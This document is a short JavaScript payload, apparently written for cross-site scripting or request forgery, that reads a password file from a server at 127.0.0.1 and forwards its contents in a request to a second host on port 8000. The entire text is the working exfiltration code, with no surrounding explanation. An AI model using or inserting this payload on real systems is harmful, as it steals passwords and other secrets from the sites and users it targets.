fetch('http://127.0.0.1/dir/pass.txt')
.then(response=>response.text())
.then(data=>(fetch('http://10.49.190.134:8000/'+data)))
